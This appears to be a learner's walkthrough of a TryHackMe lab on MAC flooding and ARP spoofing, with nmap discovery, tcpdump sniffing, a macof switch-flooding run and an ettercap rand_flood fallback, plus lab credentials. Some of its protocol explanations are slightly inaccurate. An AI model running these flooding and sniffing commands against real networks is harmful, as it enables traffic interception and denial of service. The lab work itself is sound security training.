---
Learn how to use MAC Flooding to sniff traffic and ARP Cache Poisoning to manipulate network traffic as a MITM.
---

![](https://cdn.pixabay.com/photo/2018/08/26/18/45/server-3632935_960_720.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/eef593f2e4745dcb78b16698115f2561.jpeg)


### Getting Started

 Start Machine

While it's not required, ideally, you should have a general understanding of OSI Model [Layer 2](https://en.wikipedia.org/wiki/Data_link_layer) (L2) [network switches](https://en.wikipedia.org/wiki/Network_switch) work, what a [MAC table](https://en.wikipedia.org/wiki/MAC_table) is, what the Address Resolution Protocol ([ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol)) does, and how to use Wireshark at a basic level. If you're not comfortable with these topics, please check out the [Network](https://tryhackme.com/module/network-fundamentals) and [Linux](https://tryhackme.com/module/linux-fundamentals) Fundamentals modules and [Wireshark](https://tryhackme.com/room/wireshark) room.

Now that we've covered the prerequisites go ahead and start the machine and let's get started!

_Please, allow a minimum of **5 minutes** for the machine(s) to get the services fully up and running, before connecting via SSH._

Answer the questions below

I understand and have started the machine by pressing the Start Machine button.

### Initial Access

_For the sake of this room, let's assume the following:_

While conducting a pentest, you have gained initial access to a network and escalated privileges to root on a Linux machine. During your routine OS enumeration, you realize it's a [dual-homed](https://en.wikipedia.org/wiki/Dual-homed) host, meaning it is connected to two (or more) networks. Being the curious hacker you are, you decided to explore this network to see if you can move laterally.

After having established **persistence**, you can access the compromised host via **SSH**:

**User**

**Password**

**IP**

**Port**

admin

Layer2

MACHINE_IP

22

_Please, allow a minimum of **5 minutes** for the machine to get the services fully up and running, **then** try connecting with SSH (if you login, and the command line isn't showing up yet, **don't hit Ctrl+C!** Just be patient…):_

`ssh -o StrictHostKeyChecking=accept-new admin@MACHINE_IP`

Note: The **admin** user is in the **sudo** group. I suggest using the **root** user to complete this room: `sudo su -`

Answer the questions below

Now, can you (re)gain access? (Yay/Nay)  

After 5-8 minutes you should be able to SSH into the machine with the credentials above.

*Yay*


### Network Discovery

As mentioned previously, the host is connected to one or more additional networks. You are currently connected to the machine via SSH on Ethernet adapter **eth0**. The network of interest is connected with Ethernet adapter **eth1**.

First, have a look at the adapter:  

`ip address show eth1` or the shorthand version: `ip a s eth1`

Using this knowledge, answer questions **#1** and **#2**.

Now, use the network enumeration tool of your choice, e.g., **ping**, a bash or python script, or Nmap (pre-installed) to discover other hosts in the network and answer question **#3**.  

Answer the questions below

```bash
┌──(kali㉿kali)-[~]
└─$ ssh admin@10.10.132.221
The authenticity of host '10.10.132.221 (10.10.132.221)' can't be established.
ED25519 key fingerprint is SHA256:QKJ7M2afSUAQcRjyw4fi0Jb4Hik8yPJz4AQI2rAr63A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.221' (ED25519) to the list of known hosts.
admin@10.10.132.221's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-100-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

5 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

   __/\\\______________/\\\_________________/\\\\\\___________________________________________________________________        
    _\/\\\_____________\/\\\________________\////\\\___________________________________________________________________       
     _\/\\\_____________\/\\\___________________\/\\\___________________________________________________________________      
      _\//\\\____/\\\____/\\\______/\\\\\\\\_____\/\\\________/\\\\\\\\_____/\\\\\_______/\\\\\__/\\\\\_______/\\\\\\\\__     
       __\//\\\__/\\\\\__/\\\_____/\\\/////\\\____\/\\\______/\\\//////____/\\\///\\\___/\\\///\\\\\///\\\___/\\\/////\\\_    
        ___\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\_____\/\\\_____/\\\__________/\\\__\//\\\_\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\__   
         ____\//\\\\\\//\\\\\_____\//\\///////______\/\\\____\//\\\________\//\\\__/\\\__\/\\\__\/\\\__\/\\\_\//\\///////___  
          _____\//\\\__\//\\\_______\//\\\\\\\\\\__/\\\\\\\\\__\///\\\\\\\\__\///\\\\\/___\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\_ 
           ______\///____\///_________\//////////__\/////////_____\////////_____\/////_____\///___\///___\///____\//////////__
               ________________________________________________________________/\\\________________________        
                _______________________________________________________________\/\\\________________________       
                 _____/\\\____________________________________________/\\\______\/\\\________________________      
                  __/\\\\\\\\\\\_____/\\\\\_________________________/\\\\\\\\\\\_\/\\\_____________/\\\\\\\\__     
                   _\////\\\////____/\\\///\\\______________________\////\\\////__\/\\\\\\\\\\____/\\\/////\\\_    
                    ____\/\\\_______/\\\__\//\\\________________________\/\\\______\/\\\/////\\\__/\\\\\\\\\\\__   
                     ____\/\\\_/\\__\//\\\__/\\\_________________________\/\\\_/\\__\/\\\___\/\\\_\//\\///////___  
                      ____\//\\\\\____\///\\\\\/__________________________\//\\\\\___\/\\\___\/\\\__\//\\\\\\\\\\_ 
                       _____\/////_______\/////_____________________________\/////____\///____\///____\//////////__
         __/\\\\\\\\\\\\________________________________________________________________________________________        
          _\/\\\////////\\\______________________________________________________________________________________       
           _\/\\\______\//\\\_______________________________/\\\\\\\\_____________________________________________      
            _\/\\\_______\/\\\__/\\\____/\\\__/\\/\\\\\\____/\\\////\\\_____/\\\\\\\\______/\\\\\_____/\\/\\\\\\___     
             _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\////\\\__\//\\\\\\\\\___/\\\/////\\\___/\\\///\\\__\/\\\////\\\__    
              _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\//\\\__\///////\\\__/\\\\\\\\\\\___/\\\__\//\\\_\/\\\__\//\\\_   
               _\/\\\_______/\\\__\/\\\___\/\\\_\/\\\___\/\\\__/\\_____\\\_\//\\///////___\//\\\__/\\\__\/\\\___\/\\\_  
                _\/\\\\\\\\\\\\/___\//\\\\\\\\\__\/\\\___\/\\\_\//\\\\\\\\___\//\\\\\\\\\\__\///\\\\\/___\/\\\___\/\\\_ 
                 _\////////////______\/////////___\///____\///___\////////_____\//////////_____\/////_____\///____\///__
        ______________________/\\\\\___________________________/\\\\\__________/\\\\\\\\\\\____/\\\\\\\\\\\_______        
         ____________________/\\\///__________________________/\\\///\\\______/\\\/////////\\\_\/////\\\///________       
          ___________________/\\\____________________________/\\\/__\///\\\___\//\\\______\///______\/\\\___________      
           _____/\\\\\_____/\\\\\\\\\________________________/\\\______\//\\\___\////\\\_____________\/\\\___________     
            ___/\\\///\\\__\////\\\//________________________\/\\\_______\/\\\______\////\\\__________\/\\\______/\\\_    
             __/\\\__\//\\\____\/\\\__________________________\//\\\______/\\\__________\////\\\_______\/\\\_____\///__   
              _\//\\\__/\\\_____\/\\\___________________________\///\\\__/\\\_____/\\\______\//\\\______\/\\\___________  
               __\///\\\\\/______\/\\\_____________________________\///\\\\\/_____\///\\\\\\\\\\\/____/\\\\\\\\\\\__/\\\_ 
                ____\/////________\///________________________________\/////_________\///////////_____\///////////__\///__
 __/\\\_________________/\\\\\\\\\_____/\\\________/\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\__________________/\\\\\\\\\_____        
  _\/\\\_______________/\\\\\\\\\\\\\__\///\\\____/\\\/__\/\\\///////////___/\\\///////\\\______________/\\\///////\\\___       
   _\/\\\______________/\\\/////////\\\___\///\\\/\\\/____\/\\\_____________\/\\\_____\/\\\_____________\///______\//\\\__      
    _\/\\\_____________\/\\\_______\/\\\_____\///\\\/______\/\\\\\\\\\\\_____\/\\\\\\\\\\\/________________________/\\\/___     
     _\/\\\_____________\/\\\\\\\\\\\\\\\_______\/\\\_______\/\\\///////______\/\\\//////\\\_____________________/\\\//_____    
      _\/\\\_____________\/\\\/////////\\\_______\/\\\_______\/\\\_____________\/\\\____\//\\\_________________/\\\//________   
       _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_____________\/\\\_____\//\\\______________/\\\/___________  
        _\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_______\/\\\_______\/\\\\\\\\\\\\\\\_\/\\\______\//\\\____________/\\\\\\\\\\\\\\\_ 
         _\///////////////__\///________\///________\///________\///////////////__\///________\///____________\///////////////__
              ____/\\\__/\\\_________________________________________________________________________/\\\\\_        
               ___\/\\\_\/\\\_______________________________________________________________________/\\\///__       
                __/\\\\\\\\\\\\\____________________________________________________________________/\\\______      
                 _\///\\\///\\\/_____/\\\\\__/\\\\\____/\\\\\\\\\________/\\\\\\\\_____/\\\\\_____/\\\\\\\\\___     
                  ___\/\\\_\/\\\____/\\\///\\\\\///\\\_\////////\\\_____/\\\//////____/\\\///\\\__\////\\\//____    
                   __/\\\\\\\\\\\\\_\/\\\_\//\\\__\/\\\___/\\\\\\\\\\___/\\\__________/\\\__\//\\\____\/\\\______   
                    _\///\\\///\\\/__\/\\\__\/\\\__\/\\\__/\\\/////\\\__\//\\\________\//\\\__/\\\_____\/\\\______  
                     ___\/\\\_\/\\\___\/\\\__\/\\\__\/\\\_\//\\\\\\\\/\\__\///\\\\\\\\__\///\\\\\/______\/\\\______ 
                      ___\///__\///____\///___\///___\///___\////////\//_____\////////_____\/////________\///_______


admin@eve:~$ sudo su -
[sudo] password for admin: 
root@eve:~# 

root@eve:~# ip a s eth1
5: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 82:5c:e6:fa:1c:c0 brd ff:ff:ff:ff:ff:ff
    inet 192.168.12.66/24 brd 192.168.12.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::c4ae:baff:fe8a:42e9/64 scope link 
       valid_lft forever preferred_lft forever

The command `nmap -sn 192.168.12.66/24` is used to perform a "ping sweep" using the `nmap` tool. The option `-sn` tells `nmap` to perform a "ping scan", which is used to quickly determine which hosts on a network are online. The target of the scan is specified as `192.168.12.66/24`, which means that `nmap` will scan the range of IP addresses from `192.168.12.0` to `192.168.12.255`, inclusive. This type of scan is used to get a quick overview of hosts on a network, without performing a full port scan, which can take much longer to complete.

root@eve:~# nmap -sn 192.168.12.66/24
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-06 15:35 UTC
Nmap scan report for alice (192.168.12.1)
Host is up (0.00018s latency).
MAC Address: 00:50:79:66:68:00 (Private)
Nmap scan report for bob (192.168.12.2)
Host is up (0.00016s latency).
MAC Address: 00:50:79:66:68:01 (Private)
Nmap scan report for eve (192.168.12.66)
Host is up.

or

root@eve:~# nmap -sV -sC -p- -v 192.168.12.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-06 15:38 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:38
Completed NSE at 15:38, 0.00s elapsed
Initiating NSE at 15:38
Completed NSE at 15:38, 0.00s elapsed
Initiating NSE at 15:38
Completed NSE at 15:38, 0.00s elapsed
Initiating ARP Ping Scan at 15:38
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 15:38, 2.10s elapsed (255 total hosts)
Nmap scan report for 192.168.12.0 [host down]
Nmap scan report for 192.168.12.3 [host down]
Nmap scan report for 192.168.12.4 [host down]
Nmap scan report for 192.168.12.5 [host down]
Nmap scan report for 192.168.12.6 [host down]
Nmap scan report for 192.168.12.7 [host down]
Nmap scan report for 192.168.12.8 [host down]
Nmap scan report for 192.168.12.9 [host down]
Nmap scan report for 192.168.12.10 [host down]
Nmap scan report for 192.168.12.11 [host down]
Nmap scan report for 192.168.12.12 [host down]
Nmap scan report for 192.168.12.13 [host down]
Nmap scan report for 192.168.12.14 [host down]
Nmap scan report for 192.168.12.15 [host down]
Nmap scan report for 192.168.12.16 [host down]
Nmap scan report for 192.168.12.17 [host down]
Nmap scan report for 192.168.12.18 [host down]
Nmap scan report for 192.168.12.19 [host down]
Nmap scan report for 192.168.12.20 [host down]
Nmap scan report for 192.168.12.21 [host down]
Nmap scan report for 192.168.12.22 [host down]
Nmap scan report for 192.168.12.23 [host down]
Nmap scan report for 192.168.12.24 [host down]
Nmap scan report for 192.168.12.25 [host down]
Nmap scan report for 192.168.12.26 [host down]
Nmap scan report for 192.168.12.27 [host down]
Nmap scan report for 192.168.12.28 [host down]
Nmap scan report for 192.168.12.29 [host down]
Nmap scan report for 192.168.12.30 [host down]
Nmap scan report for 192.168.12.31 [host down]
Nmap scan report for 192.168.12.32 [host down]
Nmap scan report for 192.168.12.33 [host down]
Nmap scan report for 192.168.12.34 [host down]
Nmap scan report for 192.168.12.35 [host down]
Nmap scan report for 192.168.12.36 [host down]
Nmap scan report for 192.168.12.37 [host down]
Nmap scan report for 192.168.12.38 [host down]
Nmap scan report for 192.168.12.39 [host down]
Nmap scan report for 192.168.12.40 [host down]
Nmap scan report for 192.168.12.41 [host down]
Nmap scan report for 192.168.12.42 [host down]
Nmap scan report for 192.168.12.43 [host down]
Nmap scan report for 192.168.12.44 [host down]
Nmap scan report for 192.168.12.45 [host down]
Nmap scan report for 192.168.12.46 [host down]
Nmap scan report for 192.168.12.47 [host down]
Nmap scan report for 192.168.12.48 [host down]
Nmap scan report for 192.168.12.49 [host down]
Nmap scan report for 192.168.12.50 [host down]
Nmap scan report for 192.168.12.51 [host down]
Nmap scan report for 192.168.12.52 [host down]
Nmap scan report for 192.168.12.53 [host down]
Nmap scan report for 192.168.12.54 [host down]
Nmap scan report for 192.168.12.55 [host down]
Nmap scan report for 192.168.12.56 [host down]
Nmap scan report for 192.168.12.57 [host down]
Nmap scan report for 192.168.12.58 [host down]
Nmap scan report for 192.168.12.59 [host down]
Nmap scan report for 192.168.12.60 [host down]
Nmap scan report for 192.168.12.61 [host down]
Nmap scan report for 192.168.12.62 [host down]
Nmap scan report for 192.168.12.63 [host down]
Nmap scan report for 192.168.12.64 [host down]
Nmap scan report for 192.168.12.65 [host down]
Nmap scan report for 192.168.12.67 [host down]
Nmap scan report for 192.168.12.68 [host down]
Nmap scan report for 192.168.12.69 [host down]
Nmap scan report for 192.168.12.70 [host down]
Nmap scan report for 192.168.12.71 [host down]
Nmap scan report for 192.168.12.72 [host down]
Nmap scan report for 192.168.12.73 [host down]
Nmap scan report for 192.168.12.74 [host down]
Nmap scan report for 192.168.12.75 [host down]
Nmap scan report for 192.168.12.76 [host down]
Nmap scan report for 192.168.12.77 [host down]
Nmap scan report for 192.168.12.78 [host down]
Nmap scan report for 192.168.12.79 [host down]
Nmap scan report for 192.168.12.80 [host down]
Nmap scan report for 192.168.12.81 [host down]
Nmap scan report for 192.168.12.82 [host down]
Nmap scan report for 192.168.12.83 [host down]
Nmap scan report for 192.168.12.84 [host down]
Nmap scan report for 192.168.12.85 [host down]
Nmap scan report for 192.168.12.86 [host down]
Nmap scan report for 192.168.12.87 [host down]
Nmap scan report for 192.168.12.88 [host down]
Nmap scan report for 192.168.12.89 [host down]
Nmap scan report for 192.168.12.90 [host down]
Nmap scan report for 192.168.12.91 [host down]
Nmap scan report for 192.168.12.92 [host down]
Nmap scan report for 192.168.12.93 [host down]
Nmap scan report for 192.168.12.94 [host down]
Nmap scan report for 192.168.12.95 [host down]
Nmap scan report for 192.168.12.96 [host down]
Nmap scan report for 192.168.12.97 [host down]
Nmap scan report for 192.168.12.98 [host down]
Nmap scan report for 192.168.12.99 [host down]
Nmap scan report for 192.168.12.100 [host down]
Nmap scan report for 192.168.12.101 [host down]
Nmap scan report for 192.168.12.102 [host down]
Nmap scan report for 192.168.12.103 [host down]
Nmap scan report for 192.168.12.104 [host down]
Nmap scan report for 192.168.12.105 [host down]
Nmap scan report for 192.168.12.106 [host down]
Nmap scan report for 192.168.12.107 [host down]
Nmap scan report for 192.168.12.108 [host down]
Nmap scan report for 192.168.12.109 [host down]
Nmap scan report for 192.168.12.110 [host down]
Nmap scan report for 192.168.12.111 [host down]
Nmap scan report for 192.168.12.112 [host down]
Nmap scan report for 192.168.12.113 [host down]
Nmap scan report for 192.168.12.114 [host down]
Nmap scan report for 192.168.12.115 [host down]
Nmap scan report for 192.168.12.116 [host down]
Nmap scan report for 192.168.12.117 [host down]
Nmap scan report for 192.168.12.118 [host down]
Nmap scan report for 192.168.12.119 [host down]
Nmap scan report for 192.168.12.120 [host down]
Nmap scan report for 192.168.12.121 [host down]
Nmap scan report for 192.168.12.122 [host down]
Nmap scan report for 192.168.12.123 [host down]
Nmap scan report for 192.168.12.124 [host down]
Nmap scan report for 192.168.12.125 [host down]
Nmap scan report for 192.168.12.126 [host down]
Nmap scan report for 192.168.12.127 [host down]
Nmap scan report for 192.168.12.128 [host down]
Nmap scan report for 192.168.12.129 [host down]
Nmap scan report for 192.168.12.130 [host down]
Nmap scan report for 192.168.12.131 [host down]
Nmap scan report for 192.168.12.132 [host down]
Nmap scan report for 192.168.12.133 [host down]
Nmap scan report for 192.168.12.134 [host down]
Nmap scan report for 192.168.12.135 [host down]
Nmap scan report for 192.168.12.136 [host down]
Nmap scan report for 192.168.12.137 [host down]
Nmap scan report for 192.168.12.138 [host down]
Nmap scan report for 192.168.12.139 [host down]
Nmap scan report for 192.168.12.140 [host down]
Nmap scan report for 192.168.12.141 [host down]
Nmap scan report for 192.168.12.142 [host down]
Nmap scan report for 192.168.12.143 [host down]
Nmap scan report for 192.168.12.144 [host down]
Nmap scan report for 192.168.12.145 [host down]
Nmap scan report for 192.168.12.146 [host down]
Nmap scan report for 192.168.12.147 [host down]
Nmap scan report for 192.168.12.148 [host down]
Nmap scan report for 192.168.12.149 [host down]
Nmap scan report for 192.168.12.150 [host down]
Nmap scan report for 192.168.12.151 [host down]
Nmap scan report for 192.168.12.152 [host down]
Nmap scan report for 192.168.12.153 [host down]
Nmap scan report for 192.168.12.154 [host down]
Nmap scan report for 192.168.12.155 [host down]
Nmap scan report for 192.168.12.156 [host down]
Nmap scan report for 192.168.12.157 [host down]
Nmap scan report for 192.168.12.158 [host down]
Nmap scan report for 192.168.12.159 [host down]
Nmap scan report for 192.168.12.160 [host down]
Nmap scan report for 192.168.12.161 [host down]
Nmap scan report for 192.168.12.162 [host down]
Nmap scan report for 192.168.12.163 [host down]
Nmap scan report for 192.168.12.164 [host down]
Nmap scan report for 192.168.12.165 [host down]
Nmap scan report for 192.168.12.166 [host down]
Nmap scan report for 192.168.12.167 [host down]
Nmap scan report for 192.168.12.168 [host down]
Nmap scan report for 192.168.12.169 [host down]
Nmap scan report for 192.168.12.170 [host down]
Nmap scan report for 192.168.12.171 [host down]
Nmap scan report for 192.168.12.172 [host down]
Nmap scan report for 192.168.12.173 [host down]
Nmap scan report for 192.168.12.174 [host down]
Nmap scan report for 192.168.12.175 [host down]
Nmap scan report for 192.168.12.176 [host down]
Nmap scan report for 192.168.12.177 [host down]
Nmap scan report for 192.168.12.178 [host down]
Nmap scan report for 192.168.12.179 [host down]
Nmap scan report for 192.168.12.180 [host down]
Nmap scan report for 192.168.12.181 [host down]
Nmap scan report for 192.168.12.182 [host down]
Nmap scan report for 192.168.12.183 [host down]
Nmap scan report for 192.168.12.184 [host down]
Nmap scan report for 192.168.12.185 [host down]
Nmap scan report for 192.168.12.186 [host down]
Nmap scan report for 192.168.12.187 [host down]
Nmap scan report for 192.168.12.188 [host down]
Nmap scan report for 192.168.12.189 [host down]
Nmap scan report for 192.168.12.190 [host down]
Nmap scan report for 192.168.12.191 [host down]
Nmap scan report for 192.168.12.192 [host down]
Nmap scan report for 192.168.12.193 [host down]
Nmap scan report for 192.168.12.194 [host down]
Nmap scan report for 192.168.12.195 [host down]
Nmap scan report for 192.168.12.196 [host down]
Nmap scan report for 192.168.12.197 [host down]
Nmap scan report for 192.168.12.198 [host down]
Nmap scan report for 192.168.12.199 [host down]
Nmap scan report for 192.168.12.200 [host down]
Nmap scan report for 192.168.12.201 [host down]
Nmap scan report for 192.168.12.202 [host down]
Nmap scan report for 192.168.12.203 [host down]
Nmap scan report for 192.168.12.204 [host down]
Nmap scan report for 192.168.12.205 [host down]
Nmap scan report for 192.168.12.206 [host down]
Nmap scan report for 192.168.12.207 [host down]
Nmap scan report for 192.168.12.208 [host down]
Nmap scan report for 192.168.12.209 [host down]
Nmap scan report for 192.168.12.210 [host down]
Nmap scan report for 192.168.12.211 [host down]
Nmap scan report for 192.168.12.212 [host down]
Nmap scan report for 192.168.12.213 [host down]
Nmap scan report for 192.168.12.214 [host down]
Nmap scan report for 192.168.12.215 [host down]
Nmap scan report for 192.168.12.216 [host down]
Nmap scan report for 192.168.12.217 [host down]
Nmap scan report for 192.168.12.218 [host down]
Nmap scan report for 192.168.12.219 [host down]
Nmap scan report for 192.168.12.220 [host down]
Nmap scan report for 192.168.12.221 [host down]
Nmap scan report for 192.168.12.222 [host down]
Nmap scan report for 192.168.12.223 [host down]
Nmap scan report for 192.168.12.224 [host down]
Nmap scan report for 192.168.12.225 [host down]
Nmap scan report for 192.168.12.226 [host down]
Nmap scan report for 192.168.12.227 [host down]
Nmap scan report for 192.168.12.228 [host down]
Nmap scan report for 192.168.12.229 [host down]
Nmap scan report for 192.168.12.230 [host down]
Nmap scan report for 192.168.12.231 [host down]
Nmap scan report for 192.168.12.232 [host down]
Nmap scan report for 192.168.12.233 [host down]
Nmap scan report for 192.168.12.234 [host down]
Nmap scan report for 192.168.12.235 [host down]
Nmap scan report for 192.168.12.236 [host down]
Nmap scan report for 192.168.12.237 [host down]
Nmap scan report for 192.168.12.238 [host down]
Nmap scan report for 192.168.12.239 [host down]
Nmap scan report for 192.168.12.240 [host down]
Nmap scan report for 192.168.12.241 [host down]
Nmap scan report for 192.168.12.242 [host down]
Nmap scan report for 192.168.12.243 [host down]
Nmap scan report for 192.168.12.244 [host down]
Nmap scan report for 192.168.12.245 [host down]
Nmap scan report for 192.168.12.246 [host down]
Nmap scan report for 192.168.12.247 [host down]
Nmap scan report for 192.168.12.248 [host down]
Nmap scan report for 192.168.12.249 [host down]
Nmap scan report for 192.168.12.250 [host down]
Nmap scan report for 192.168.12.251 [host down]
Nmap scan report for 192.168.12.252 [host down]
Nmap scan report for 192.168.12.253 [host down]
Nmap scan report for 192.168.12.254 [host down]
Nmap scan report for 192.168.12.255 [host down]
Initiating SYN Stealth Scan at 15:38
Scanning 2 hosts [65535 ports/host]
Discovered open port 22/tcp on 192.168.12.2
Discovered open port 22/tcp on 192.168.12.1
Discovered open port 554/tcp on 192.168.12.2
....

root@eve:~# cat /etc/hosts
127.0.0.1 	localhost
192.168.12.1 	alice
192.168.12.2 	bob
192.168.12.66	eve

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


```


What is your IP address?  

*192.168.12.66*

What's the network's CIDR prefix?  

Prefix format: /??

*/24*

How many other live hosts are there?  

*2*

What's the hostname of the first host (lowest IP address) you've found?

Use Nmap or take a look at a particular file that maps IPs to hostnames.

*alice*


### Passive Network Sniffing

Simply scanning those hosts won't help us gather any useful information, and you may be asking, what could a pentester do in this situation? Depending on the **rules of engagement** and **scope**, you could try **sniffing** traffic on this network.

The diagram below describes your current situation where you are the **Attacker** and have persistent access to **eve.**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png)  

Let's try running **tcpdump** on the **eth1** network interface:

`tcpdump -i eth1`

Optionally, for a more verbose output that prints each packet (minus its link level header) in ASCII format:

`tcpdump -A -i eth1   `

Try to answer questions **#1** through **#2**.  

Now, let's take a closer look at the captured packets! We can redirect them into a **pcap** file providing a destination file via the **-w** argument:

`tcpdump -A -i eth1 -w /tmp/tcpdump.pcap`

Capture traffic for about a minute, then transfer the pcap to either your machine or the AttackBox to open it in Wireshark.

Example to transfer the packet capture using **scp** and open it in Wireshark:

`scp admin@10.10.132.221:/tmp/tcpdump.pcap .   wireshark tcpdump.pcap   `

Now, you should be able to answer questions **#3** and **#4**.

Note: If you receive an error "tcpdump: /tmp/tcpdump.pcap: Permission denied" and cannot overwrite the existing **/tmp/tcpdump.pcap** file, specify a new filename such as tcpdump**2**.pcap, or run `rm -f /tmp/*.pcap` then re-run **tcpdump**.  

Answer the questions below

```
root@eve:~# tcpdump -A -i eth1 -w /tmp/tcpdump.pcap
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
^C76 packets captured
76 packets received by filter
0 packets dropped by kernel

This is a command used in the command-line interface of the `tcpdump` tool. The options used in the command are:

-   `-A`: This option sets the output format to ASCII. This means that the captured packets will be displayed in a human-readable format, instead of in their raw binary form.
    
-   `-i eth1`: This option specifies the interface to be used, in this case, Ethernet interface 1. `tcpdump` will capture and display packets transmitted and received through this interface.
    
-   `-w /tmp/tcpdump.pcap`: This option writes the captured packets to a file in the PCAP format. The file will be saved in the `/tmp` directory with the name `tcpdump.pcap`.
    

`tcpdump` is a tool for capturing and displaying network packets. In this command, the `tcpdump` tool is being used to capture packets transmitted and received through Ethernet interface 1 and save the output to a PCAP file. The `-A` option sets the output format to ASCII, so that the captured packets will be displayed in a human-readable format.

┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ scp admin@10.10.132.221:/tmp/tcpdump.pcap .
admin@10.10.132.221's password: 
tcpdump.pcap                                                                                                     100%   51KB  50.9KB/s   00:01    
                                                                                                                                                   
┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ file tcpdump.pcap 
tcpdump.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)

┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ wireshark tcpdump.pcap
```

![[Pasted image 20230206104919.png]]

Can you see any traffic from those hosts? (Yay/Nay)  

*Yay*

Who keeps sending packets to eve?  

*bob*

What type of packets are sent?  

It's a layer 3 protocol

*icmp*

What's the size of their data section? (bytes)  

"Data (*** bytes)"

*666*


### Sniffing while MAC Flooding

Unfortunately, we weren't able to capture any interesting traffic so far. However, we're not going to give up this easily! So, how can we capture more network traffic? As mentioned in the room description, we could try to launch a [MAC flooding](https://en.wikipedia.org/wiki/MAC_flooding) attack against the L2-Switch.

**Beware:** MAC flooding could trigger an alarm in a SOC. No, seriously, suspicious layer 2 traffic can easily be detected and reported by state-of-the-art and properly configured network devices. Even worse, your network port could even get blocked by the network device altogether, rendering your machine locked out of the network. In case of production services running on or production traffic being routed through that network connection, this could even result in an effective **Denial-of-Service**!

However, if we're successful, the switch will resort to fail-open mode and temporarily operate similarly to a network hub – forwarding all received frames to every connected port (aside from the port the traffic originated from). This would allow an adversary or pentester to sniff the network traffic between other hosts that normally wouldn't be received by their device if the switch were functioning properly.  

Considering such an attack vector is only recommended when you have reasons to believe that…

-   It is in fact a switched network (and not a virtual bridge) **AND**  
    
-   The switch might be a consumer or prosumer (unmanaged) switch **OR** the network admins haven't configured mitigations such as Dynamic ARP Inspection (DAI) for instance **AND**
-   ARP and MAC spoofing attacks are explicitly permitted in the **rules of engagement**. When in doubt, clarify with your client first!  
    

_Anyhow, let's assume you've met the well-thought decision to give it a try._

For better usability, open a second SSH session. This way, you can leave the **tcpdump** process running in the foreground on the first SSH session:

`tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap`

Now, on the second SSH session, buckle up and let **[macof](http://manpages.ubuntu.com/manpages/bionic/man8/macof.8.html)** run against the interface to start flooding the switch:  

`macof -i eth1`

After around 30 seconds, stop both **macof** and **tcpdump** (Ctrl+C).

As in the previous task, transfer the **pcap** to your machine (**kali/AttackBox)** and take a look:

`scp admin@10.10.132.221:/tmp/tcpdump2.pcap .   wireshark tcpdump2.pcap   `

Now, you should be able to answer questions **#1** and **#2**.

**Note:** If it didn't work, try to capture for 30 seconds, again (while **macof** is running).  
If it still won't work, give it one last try with a capture duration of one minute.  
As the measure of last resort, try using **[ettercap](https://www.kali.org/tools/ettercap/)** (introduced in the following tasks) with the **rand_flood** plugin:

`ettercap -T -i eth1 -P rand_flood -q -w /tmp/tcpdump3.pcap` (Quit with **q**)

Answer the questions below

```
A MAC Flood attack is a type of denial-of-service (DoS) attack that targets the Media Access Control (MAC) address table of a network switch. The goal of this attack is to exhaust the MAC address table of the switch, causing it to flood broadcast traffic to all devices on the network. This flood of broadcast traffic can cause the switch to become overwhelmed and unavailable, leading to a disruption of network services.

The attacker typically sends a large number of packets to the target switch with fake or randomly generated source MAC addresses. The switch stores these addresses in its MAC address table and uses them to forward traffic to the correct destination. As the number of fake MAC addresses grows, the switch eventually runs out of space in its MAC address table, causing it to flood broadcast traffic to all devices on the network.

Mac Flood attacks can be mitigated by configuring port security on switches, which limits the number of MAC addresses that can be learned on a given port. Network administrators can also implement security measures such as implementing VLANs, implementing Access Control Lists (ACLs), and deploying intrusion detection and prevention systems (IDS/IPS).

root@eve:~# tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
^C58664 packets captured
58664 packets received by filter
0 packets dropped by kernel


root@eve:~# macof -i eth1
b8:27:46:20:85:1a 98:5:f8:6a:a0:0 0.0.0.0.46286 > 0.0.0.0.59788: S 377004878:377004878(0) win 512
39:6c:5e:45:bd:88 25:cb:e2:2b:55:97 0.0.0.0.50481 > 0.0.0.0.4103: S 334728273:334728273(0) win 512
b9:c:63:1f:6c:25 c7:95:f:32:4f:95 0.0.0.0.4356 > 0.0.0.0.8062: S 1859715379:1859715379(0) win 512
d3:aa:6f:2c:b:38 70:91:f0:b:d3:c7 0.0.0.0.675 > 0.0.0.0.28025: S 1665627953:1665627953(0) win 512
